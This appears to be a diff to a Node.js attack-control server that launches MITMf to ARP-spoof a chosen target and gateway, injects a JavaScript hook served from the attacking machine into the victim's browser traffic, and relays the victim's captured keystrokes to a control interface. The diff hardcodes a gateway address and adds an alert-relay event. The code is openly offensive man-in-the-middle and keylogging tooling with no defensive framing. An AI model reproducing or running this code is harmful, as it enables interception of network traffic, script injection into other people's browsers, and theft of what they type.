@@ -3,7 +3,6 @@ var express = require('express');
 var session = require('express-session');
 var app = express();
 var http = require('http').Server(app);
-var terminal = require("web-terminal");
 var url = require('url');
 var fs = require('fs');
 var io = require('socket.io')(http, { pingTimeout: 600000});
@@ -162,7 +161,7 @@ listener.sockets.on('connection', function(socket){
         var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24)).slice(0, -1)+"1";
         console.log(gateway)
         var scriptPath = 'http://'+ip.address()+':5001/hook/pnsmn.js';
-        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway',gateway,'--inject','--js-url',scriptPath];
+        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway','172.21.0.50','--inject','--js-url',scriptPath];
         openTerminal("python",options);
     });
 
@@ -188,6 +187,11 @@ listener.sockets.on('connection', function(socket){
     socket.on('keylogger',function(data){
         console.log(data.id+" "+data.value);
         socket.broadcast.emit('ui_keylogger',{"id":data.id,"value":data.value});
+    });
+
+    socket.on('toggleAlert',function(data){
+        console.log(data.text);
+        socket.broadcast.emit('toggleAlert_ui',{"text":data.text});
     });
 
 });
